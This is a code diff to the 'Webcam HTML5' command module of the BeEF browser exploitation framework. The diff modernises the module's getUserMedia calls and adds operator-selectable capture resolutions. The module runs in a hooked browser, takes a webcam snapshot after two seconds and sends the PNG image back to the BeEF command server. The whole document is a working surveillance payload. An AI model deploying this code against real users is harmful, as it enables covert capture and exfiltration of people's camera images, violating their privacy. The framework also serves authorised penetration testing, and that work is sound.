@@ -25,27 +25,93 @@ beef.execute(function() {
     var ctx = can_el.getContext('2d');
 
     var localMediaStream = null;
+    var streaming = false;
+
+    var width = 320;    // We will scale the photo width to this
+    var height = 0;     // This will be computed based on the input stream
+
 
     var cap = function() {
         if (localMediaStream) {
-            ctx.drawImage(vid_el,0,0);
+            ctx.drawImage(vid_el,0,0,width,height);
             beef.net.send("<%= @command_url %>",<%= @command_id %>, 'image='+can_el.toDataURL('image/png'));
         } else {
             beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong', beef.are.status_error());
         }
-    }
+    };
 
     window.URL = window.URL || window.webkitURL;
-    navigator.getUserMedia  = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
 
-    navigator.getUserMedia({video:true},function(stream) {
-        vid_el.src = window.URL.createObjectURL(stream);
+    // Older browsers might not implement mediaDevices at all, so we set an empty object first
+    if (navigator.mediaDevices === undefined) {
+        navigator.mediaDevices = {};
+    }
+
+    // Some browsers partially implement mediaDevices. We can't just assign an object
+    // with getUserMedia as it would overwrite existing properties.
+    // Here, we will just add the getUserMedia property if it's missing.
+    if (navigator.mediaDevices.getUserMedia === undefined) {
+        navigator.mediaDevices.getUserMedia = function(constraints) {
+
+            // First get ahold of the legacy getUserMedia, if present
+            var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
+
+            // Some browsers just don't implement it - return a rejected promise with an error
+            // to keep a consistent interface
+            if (!getUserMedia) {
+                return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
+            }
+
+            // Otherwise, wrap the call to the old navigator.getUserMedia with a Promise
+            return new Promise(function(resolve, reject) {
+                getUserMedia.call(navigator, constraints, resolve, reject);
+            });
+        }
+    }
+
+    navigator.mediaDevices.getUserMedia({video:true}).then(function(stream) {
+        if ('srcObject' in vid_el) {
+            vid_el.srcObject = stream;
+            vid_el.play();
+        } else {
+            vid_el.src = window.URL.createObjectURL(stream);
+        }
         localMediaStream = stream;
-        setTimeout(cap,2000);
+        vid_el.addEventListener('canplay', function(ev){
+            if (!streaming) {
+                streaming = true;
+                setTimeout(cap,2000);
+            }
+        }, false);
     }, function(err) {
         beef.debug('[Webcam HTML5] Error: getUserMedia call failed');
         beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed', beef.are.status_error());
     });
 
+    // Retrieve the chosen div option from BeEF and display
+    var choice = "<%= @choice %>";
+    switch (choice) {
+        case "320x240":
+            size320(); break;
+        case "640x480":
+            size640(); break;
+        case "Full":
+            sizeFull(); break;
+        default:
+            size320();  break;
+    }
+
+    function size320() {
+        width = 320;
+        height = 240;
+    }
+    function size640() {
+        width = 640;
+        height = 480;
+    }
+    function sizeFull() {
+        width = 1280;
+        height = 720;
+    }
 });
 
